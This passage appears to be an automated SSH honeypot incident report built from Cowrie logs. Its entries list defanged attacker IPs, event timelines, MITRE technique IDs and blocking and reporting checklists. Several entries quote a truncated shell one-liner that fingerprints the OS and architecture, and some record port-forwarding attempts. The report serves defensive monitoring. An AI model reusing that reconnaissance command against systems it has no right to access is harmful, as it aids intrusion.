| `2026-08-01 09:05:39` | `cowrie.command.success` |
| `2026-08-01 09:05:39` | `cowrie.command.input` |
| `2026-08-01 09:05:39` | `cowrie.command.input` |
| `2026-08-01 09:05:39` | `cowrie.command.input` |
| `2026-08-01 09:05:39` | `cowrie.command.input` |
| `2026-08-01 09:05:40` | `cowrie.log.closed` |
| `2026-08-01 09:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38e36697cb76

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:06 |
| **Last Seen** | 2026-08-01 09:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:06:51` | `cowrie.session.connect` |
| `2026-08-01 09:06:52` | `cowrie.client.version` |
| `2026-08-01 09:06:52` | `cowrie.client.kex` |
| `2026-08-01 09:06:53` | `cowrie.login.success` |
| `2026-08-01 09:06:53` | `cowrie.session.params` |
| `2026-08-01 09:06:53` | `cowrie.command.input` |
| `2026-08-01 09:06:53` | `cowrie.command.input` |
| `2026-08-01 09:06:53` | `cowrie.command.input` |
| `2026-08-01 09:06:53` | `cowrie.command.input` |
| `2026-08-01 09:06:53` | `cowrie.command.input` |
| `2026-08-01 09:06:53` | `cowrie.command.success` |
| `2026-08-01 09:06:53` | `cowrie.command.input` |
| `2026-08-01 09:06:53` | `cowrie.command.input` |
| `2026-08-01 09:06:53` | `cowrie.command.input` |
| `2026-08-01 09:06:53` | `cowrie.command.input` |
| `2026-08-01 09:06:54` | `cowrie.log.closed` |
| `2026-08-01 09:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1744b6f92c0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:08 |
| **Last Seen** | 2026-08-01 09:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:08:13` | `cowrie.session.connect` |
| `2026-08-01 09:08:13` | `cowrie.client.version` |
| `2026-08-01 09:08:13` | `cowrie.client.kex` |
| `2026-08-01 09:08:14` | `cowrie.login.success` |
| `2026-08-01 09:08:15` | `cowrie.session.params` |
| `2026-08-01 09:08:15` | `cowrie.command.input` |
| `2026-08-01 09:08:15` | `cowrie.command.input` |
| `2026-08-01 09:08:15` | `cowrie.command.input` |
| `2026-08-01 09:08:15` | `cowrie.command.input` |
| `2026-08-01 09:08:15` | `cowrie.command.input` |
| `2026-08-01 09:08:15` | `cowrie.command.success` |
| `2026-08-01 09:08:15` | `cowrie.command.input` |
| `2026-08-01 09:08:15` | `cowrie.command.input` |
| `2026-08-01 09:08:15` | `cowrie.command.input` |
| `2026-08-01 09:08:15` | `cowrie.command.input` |
| `2026-08-01 09:08:15` | `cowrie.log.closed` |
| `2026-08-01 09:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90fd24965719

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]3` |
| **First Seen** | 2026-08-01 09:09 |
| **Last Seen** | 2026-08-01 09:09 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:09:15` | `cowrie.session.connect` |
| `2026-08-01 09:09:19` | `cowrie.client.version` |
| `2026-08-01 09:09:19` | `cowrie.client.kex` |
| `2026-08-01 09:09:35` | `cowrie.login.success` |
| `2026-08-01 09:09:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]3` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-494727d0ac3f

| Field | Detail |
|---|---|
| **Source IP** | `60.214.127[.]246` |
| **First Seen** | 2026-08-01 09:09 |
| **Last Seen** | 2026-08-01 09:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:09:29` | `cowrie.session.connect` |
| `2026-08-01 09:09:30` | `cowrie.client.version` |
| `2026-08-01 09:09:30` | `cowrie.client.kex` |
| `2026-08-01 09:09:33` | `cowrie.login.success` |
| `2026-08-01 09:09:34` | `cowrie.direct-tcpip.request` |
| `2026-08-01 09:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.214.127[.]246` to AbuseIPDB if not already reported
- [ ] Block `60.214.127[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efe4faf26c80

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:09 |
| **Last Seen** | 2026-08-01 09:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:09:36` | `cowrie.session.connect` |
| `2026-08-01 09:09:36` | `cowrie.client.version` |
| `2026-08-01 09:09:36` | `cowrie.client.kex` |
| `2026-08-01 09:09:37` | `cowrie.login.success` |
| `2026-08-01 09:09:38` | `cowrie.session.params` |
| `2026-08-01 09:09:38` | `cowrie.command.input` |
| `2026-08-01 09:09:38` | `cowrie.command.input` |
| `2026-08-01 09:09:38` | `cowrie.command.input` |
| `2026-08-01 09:09:38` | `cowrie.command.input` |
| `2026-08-01 09:09:38` | `cowrie.command.input` |
| `2026-08-01 09:09:38` | `cowrie.command.success` |
| `2026-08-01 09:09:38` | `cowrie.command.input` |
| `2026-08-01 09:09:38` | `cowrie.command.input` |
| `2026-08-01 09:09:38` | `cowrie.command.input` |
| `2026-08-01 09:09:38` | `cowrie.command.input` |
| `2026-08-01 09:09:38` | `cowrie.log.closed` |
| `2026-08-01 09:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39241aea93c1

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-08-01 09:11 |
| **Last Seen** | 2026-08-01 09:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:11:17` | `cowrie.session.connect` |
| `2026-08-01 09:11:18` | `cowrie.client.version` |
| `2026-08-01 09:11:18` | `cowrie.client.kex` |
| `2026-08-01 09:11:20` | `cowrie.login.success` |
| `2026-08-01 09:11:20` | `cowrie.direct-tcpip.request` |
| `2026-08-01 09:11:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e3040a15af2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:12 |
| **Last Seen** | 2026-08-01 09:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:12:11` | `cowrie.session.connect` |
| `2026-08-01 09:12:11` | `cowrie.client.version` |
| `2026-08-01 09:12:11` | `cowrie.client.kex` |
| `2026-08-01 09:12:12` | `cowrie.login.success` |
| `2026-08-01 09:12:13` | `cowrie.session.params` |
| `2026-08-01 09:12:13` | `cowrie.command.input` |
| `2026-08-01 09:12:13` | `cowrie.command.input` |
| `2026-08-01 09:12:13` | `cowrie.command.input` |
| `2026-08-01 09:12:13` | `cowrie.command.input` |
| `2026-08-01 09:12:13` | `cowrie.command.input` |
| `2026-08-01 09:12:13` | `cowrie.command.success` |
| `2026-08-01 09:12:13` | `cowrie.command.input` |
| `2026-08-01 09:12:13` | `cowrie.command.input` |
| `2026-08-01 09:12:13` | `cowrie.command.input` |
| `2026-08-01 09:12:13` | `cowrie.command.input` |
| `2026-08-01 09:12:14` | `cowrie.log.closed` |
| `2026-08-01 09:12:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53612d36b6b2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:13 |
| **Last Seen** | 2026-08-01 09:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:13:22` | `cowrie.session.connect` |
| `2026-08-01 09:13:22` | `cowrie.client.version` |
| `2026-08-01 09:13:22` | `cowrie.client.kex` |
| `2026-08-01 09:13:24` | `cowrie.login.success` |
| `2026-08-01 09:13:25` | `cowrie.session.params` |
| `2026-08-01 09:13:25` | `cowrie.command.input` |
| `2026-08-01 09:13:25` | `cowrie.command.input` |
| `2026-08-01 09:13:25` | `cowrie.command.input` |
| `2026-08-01 09:13:25` | `cowrie.command.input` |
| `2026-08-01 09:13:25` | `cowrie.command.input` |
| `2026-08-01 09:13:25` | `cowrie.command.success` |
| `2026-08-01 09:13:25` | `cowrie.command.input` |
| `2026-08-01 09:13:25` | `cowrie.command.input` |
| `2026-08-01 09:13:25` | `cowrie.command.input` |
| `2026-08-01 09:13:25` | `cowrie.command.input` |
| `2026-08-01 09:13:26` | `cowrie.log.closed` |
| `2026-08-01 09:13:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0523864b6161

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:14 |
| **Last Seen** | 2026-08-01 09:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:14:35` | `cowrie.session.connect` |
| `2026-08-01 09:14:35` | `cowrie.client.version` |
| `2026-08-01 09:14:35` | `cowrie.client.kex` |
| `2026-08-01 09:14:36` | `cowrie.login.success` |
| `2026-08-01 09:14:37` | `cowrie.session.params` |
| `2026-08-01 09:14:37` | `cowrie.command.input` |
| `2026-08-01 09:14:37` | `cowrie.command.input` |
| `2026-08-01 09:14:37` | `cowrie.command.input` |
| `2026-08-01 09:14:37` | `cowrie.command.input` |
| `2026-08-01 09:14:37` | `cowrie.command.input` |
| `2026-08-01 09:14:37` | `cowrie.command.success` |
| `2026-08-01 09:14:37` | `cowrie.command.input` |
| `2026-08-01 09:14:37` | `cowrie.command.input` |
| `2026-08-01 09:14:37` | `cowrie.command.input` |
| `2026-08-01 09:14:37` | `cowrie.command.input` |
| `2026-08-01 09:14:37` | `cowrie.log.closed` |
| `2026-08-01 09:14:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f9caebcaf23

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:15 |
| **Last Seen** | 2026-08-01 09:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:15:51` | `cowrie.session.connect` |
| `2026-08-01 09:15:51` | `cowrie.client.version` |
| `2026-08-01 09:15:51` | `cowrie.client.kex` |
| `2026-08-01 09:15:52` | `cowrie.login.success` |
| `2026-08-01 09:15:54` | `cowrie.session.params` |
| `2026-08-01 09:15:54` | `cowrie.command.input` |
| `2026-08-01 09:15:54` | `cowrie.command.input` |
| `2026-08-01 09:15:54` | `cowrie.command.input` |
| `2026-08-01 09:15:54` | `cowrie.command.input` |
| `2026-08-01 09:15:54` | `cowrie.command.input` |
| `2026-08-01 09:15:54` | `cowrie.command.success` |
| `2026-08-01 09:15:54` | `cowrie.command.input` |
| `2026-08-01 09:15:54` | `cowrie.command.input` |
| `2026-08-01 09:15:54` | `cowrie.command.input` |
| `2026-08-01 09:15:54` | `cowrie.command.input` |
| `2026-08-01 09:15:54` | `cowrie.log.closed` |
| `2026-08-01 09:15:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d7d20a80136

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:17 |
| **Last Seen** | 2026-08-01 09:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:17:13` | `cowrie.session.connect` |
| `2026-08-01 09:17:13` | `cowrie.client.version` |
| `2026-08-01 09:17:13` | `cowrie.client.kex` |
| `2026-08-01 09:17:14` | `cowrie.login.success` |
| `2026-08-01 09:17:15` | `cowrie.session.params` |
| `2026-08-01 09:17:15` | `cowrie.command.input` |
| `2026-08-01 09:17:15` | `cowrie.command.input` |
| `2026-08-01 09:17:15` | `cowrie.command.input` |
| `2026-08-01 09:17:15` | `cowrie.command.input` |
| `2026-08-01 09:17:15` | `cowrie.command.input` |
| `2026-08-01 09:17:15` | `cowrie.command.success` |
| `2026-08-01 09:17:15` | `cowrie.command.input` |
| `2026-08-01 09:17:15` | `cowrie.command.input` |
| `2026-08-01 09:17:15` | `cowrie.command.input` |
| `2026-08-01 09:17:15` | `cowrie.command.input` |
| `2026-08-01 09:17:15` | `cowrie.log.closed` |
| `2026-08-01 09:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2be76cddc989

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:18 |
| **Last Seen** | 2026-08-01 09:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:18:32` | `cowrie.session.connect` |
| `2026-08-01 09:18:32` | `cowrie.client.version` |
| `2026-08-01 09:18:32` | `cowrie.client.kex` |
| `2026-08-01 09:18:34` | `cowrie.login.success` |
| `2026-08-01 09:18:35` | `cowrie.session.params` |
| `2026-08-01 09:18:35` | `cowrie.command.input` |
| `2026-08-01 09:18:35` | `cowrie.command.input` |
| `2026-08-01 09:18:35` | `cowrie.command.input` |
| `2026-08-01 09:18:35` | `cowrie.command.input` |
| `2026-08-01 09:18:35` | `cowrie.command.input` |
| `2026-08-01 09:18:35` | `cowrie.command.success` |
| `2026-08-01 09:18:35` | `cowrie.command.input` |
| `2026-08-01 09:18:35` | `cowrie.command.input` |
| `2026-08-01 09:18:35` | `cowrie.command.input` |
| `2026-08-01 09:18:35` | `cowrie.command.input` |
| `2026-08-01 09:18:36` | `cowrie.log.closed` |
| `2026-08-01 09:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ab5b470dc19

| Field | Detail |
|---|---|
| **Source IP** | `130.185.96[.]113` |
| **First Seen** | 2026-08-01 09:19 |
| **Last Seen** | 2026-08-01 09:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:19:27` | `cowrie.session.connect` |
| `2026-08-01 09:19:28` | `cowrie.client.version` |
| `2026-08-01 09:19:28` | `cowrie.client.kex` |
| `2026-08-01 09:19:30` | `cowrie.login.success` |
| `2026-08-01 09:19:30` | `cowrie.direct-tcpip.request` |
| `2026-08-01 09:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.185.96[.]113` to AbuseIPDB if not already reported
- [ ] Block `130.185.96[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00a823491895

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:19 |
| **Last Seen** | 2026-08-01 09:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:19:51` | `cowrie.session.connect` |
| `2026-08-01 09:19:52` | `cowrie.client.version` |
| `2026-08-01 09:19:52` | `cowrie.client.kex` |
| `2026-08-01 09:19:53` | `cowrie.login.success` |
| `2026-08-01 09:19:54` | `cowrie.session.params` |
| `2026-08-01 09:19:54` | `cowrie.command.input` |
| `2026-08-01 09:19:54` | `cowrie.command.input` |
| `2026-08-01 09:19:54` | `cowrie.command.input` |
| `2026-08-01 09:19:54` | `cowrie.command.input` |
| `2026-08-01 09:19:54` | `cowrie.command.input` |
| `2026-08-01 09:19:54` | `cowrie.command.success` |
| `2026-08-01 09:19:54` | `cowrie.command.input` |
| `2026-08-01 09:19:54` | `cowrie.command.input` |
| `2026-08-01 09:19:54` | `cowrie.command.input` |
| `2026-08-01 09:19:54` | `cowrie.command.input` |
| `2026-08-01 09:19:55` | `cowrie.log.closed` |
| `2026-08-01 09:19:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-968e52da766b

| Field | Detail |
|---|---|
| **Source IP** | `51.75.141[.]245` |
| **First Seen** | 2026-08-01 09:20 |
